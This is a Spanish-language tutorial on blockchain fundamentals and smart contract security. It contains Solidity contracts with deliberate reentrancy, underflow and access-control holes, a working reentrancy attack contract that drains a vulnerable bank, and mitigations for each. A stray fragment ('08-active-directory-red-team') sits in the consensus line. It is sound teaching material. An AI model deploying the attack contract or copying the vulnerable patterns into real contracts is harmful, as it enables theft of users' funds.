# Fundamentos de Blockchain

## ¿Qué es Blockchain?

```
DEFINICIÓN:
Base de datos distribuida, inmutable y descentralizada

COMPONENTES:
• Bloques (transacciones agrupadas)
• Cadena (bloques enlazados criptográficamente)
• Nodos (validadores de red)
• Consensus (PoW, PoS)08-active-directory-red-team

CARACTERÍSTICAS:
✓ Inmutable (no se puede modificar)
✓ Transparente (todo es público)
✓ Descentralizado (sin autoridad central)
✓ Trustless (no requiere confianza)
```

---

## Blockchain Principales

### **Bitcoin (BTC):**

```
• Primera blockchain (2009)
• Proof of Work (PoW)
• Scripting limitado
• Enfoque: Moneda digital
```

### **Ethereum (ETH):**

```
• Smart contracts (2015)
• Turing-complete
• Lenguaje: Solidity, Vyper
• EVM (Ethereum Virtual Machine)
• Proof of Stake (desde 2022)
• DeFi, NFTs, DAOs
```

### **Otros:**

```
• Binance Smart Chain (BSC)
• Polygon (MATIC)
• Solana (SOL)
• Avalanche (AVAX)
• Fantom (FTM)
```

---

## Smart Contracts

### **¿Qué son?**

```
Programas que se ejecutan en blockchain
• Código inmutable (una vez deployed)
• Ejecución automática
• Trustless (sin intermediarios)
• Transparente (código público)

USOS:
• DeFi (finanzas descentralizadas)
• NFTs (tokens no fungibles)
• DAOs (organizaciones autónomas)
• Tokens (ERC-20, ERC-721)
• Gaming
```

---

### **Solidity Basics:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleBank {
    mapping(address => uint256) public balances;

    // Depositar fondos
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Retirar fondos
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    // Ver balance
    function getBalance() public view returns (uint256) {
        return balances[msg.sender];
    }
}
```

---

## Top 10 Smart Contract Vulnerabilities

```
1. REENTRANCY
   • Llamada recursiva antes de actualizar estado
   • The DAO hack ($60M)

2. INTEGER OVERFLOW/UNDERFLOW
   • Antes de Solidity 0.8.0
   • BeautyChain hack

3. ACCESS CONTROL
   • Funciones no protegidas
   • Cualquiera puede llamar funciones admin

4. FRONT-RUNNING
   • Ver transacción pendiente
   • Enviar propia con gas mayor

5. TIMESTAMP DEPENDENCE
   • block.timestamp manipulable por miners

6. DELEGATECALL
   • Ejecuta código en contexto del caller
   • Parity wallet hack ($30M)

7. TX.ORIGIN AUTHENTICATION
   • Usar tx.origin en vez de msg.sender
   • Phishing attacks

8. UNCHECKED EXTERNAL CALLS
   • No verificar return value
   • Fondos perdidos

9. DENIAL OF SERVICE
   • Gas limit
   • Unbounded loops

10. BAD RANDOMNESS
    • block.timestamp, blockhash predictables
    • Juegos de azar manipulables
```

---

# Smart Contract Security

## Reentrancy Attack

### **Concepto:**

```solidity
// VULNERABLE CONTRACT
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: actualiza balance DESPUÉS de transferir
    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount);

        // Envía ETH ANTES de actualizar balance
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);

        // Actualiza DESPUÉS (vulnerable a reentrancy)
        balances[msg.sender] -= amount;
    }
}
```

---

### **Exploit:**

```solidity
// ATTACK CONTRACT
contract ReentrancyAttack {
    VulnerableBank public bank;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // Depositar 1 ETH
    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    // Receive se ejecuta cuando recibe ETH
    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            // Llamar withdraw recursivamente
            bank.withdraw(1 ether);
        }
    }
}

// RESULTADO:
// 1. Deposita 1 ETH
// 2. Retira 1 ETH → receive() se ejecuta
// 3. receive() llama withdraw() nuevamente
// 4. Balance aún no actualizado → permite otro retiro
// 5. Repite hasta vaciar contrato
```

---

### **Mitigación:**

```solidity
// SECURE CONTRACT
function withdraw(uint256 amount) public {
    require(balances[msg.sender] >= amount);

    // 1. Actualizar estado PRIMERO
    balances[msg.sender] -= amount;

    // 2. Interacción externa DESPUÉS
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
}

// O usar ReentrancyGuard de OpenZeppelin
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    function withdraw(uint256 amount) public nonReentrant {
        // código seguro
    }
}
```

---

## Integer Overflow/Underflow

### **Problema (Solidity < 0.8.0):**

```solidity
// VULNERABLE (pre 0.8.0)
contract VulnerableToken {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) public {
        // Si balances[msg.sender] = 5 y amount = 10
        // 5 - 10 = underflow → 2^256 - 5 (número gigante)
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}
```

---

### **Mitigación:**

```solidity
// 1. Usar Solidity 0.8.0+ (checks automáticos)
pragma solidity ^0.8.0;

contract SafeToken {
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) public {
        // Revierte automáticamente si overflow/underflow
        balances[msg.sender] -= amount;
        balances[to] += amount;
    }
}

// 2. O usar SafeMath (pre 0.8.0)
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract SafeTokenOld {
    using SafeMath for uint256;
    mapping(address => uint256) public balances;

    function transfer(address to, uint256 amount) public {
        balances[msg.sender] = balances[msg.sender].sub(amount);
        balances[to] = balances[to].add(amount);
    }
}
```

---

## Access Control Vulnerabilities

### **Problema:**

```solidity
// VULNERABLE
contract VulnerableWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // ¡SIN RESTRICCIÓN! Cualquiera puede llamar
    function withdraw(uint256 amount) public {
        payable(msg.sender).transfer(amount);
    }
}
```

---

### **Mitigación:**

```solidity
// SECURE
contract SecureWallet {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // Modifier para verificar owner
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // Solo owner puede retirar
    function withdraw(uint256 amount) public onlyOwner {
        payable(msg.sender).transfer(amount);
    }
}

// O usar OpenZeppelin Ownable
import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureWallet is Ownable {
    function withdraw(uint256 amount) public onlyOwner {
        payable(msg.sender).transfer(amount);
    }
}
```

---

## Front-Running

### **Concepto:**

```
1. Usuario envía transacción a mempool (pendiente)
2. Bot ve la transacción
3. Bot envía transacción idéntica con GAS mayor
4. Transacción del bot se mina PRIMERO
5. Usuario pierde oportunidad/dinero

EJEMPLO:
• DEX: Usuario compra token X a $100
• Bot ve transacción pendiente
• Bot compra token X primero (front-run)
• Precio sube a $110
• Transacción original compra a $110
• Bot vende con ganancia
```

---

### **Mitigación:**

```solidity
// Commit-Reveal scheme
contract AntifrontRun {
    mapping(address => bytes32) public commits;

    // Fase 1: Commit (hash de la acción)
    function commitAction(bytes32 hash) public {
        commits[msg.sender] = hash;
    }

    // Fase 2: Reveal (después de confirmado)
    function revealAction(string memory secret, uint256 amount) public {
        bytes32 hash = keccak256(abi.encodePacked(secret, amount));
        require(commits[msg.sender] == hash, "Invalid");

        // Ejecutar acción
        // ...
    }
}

// O usar Flashbots (MEV protection)
```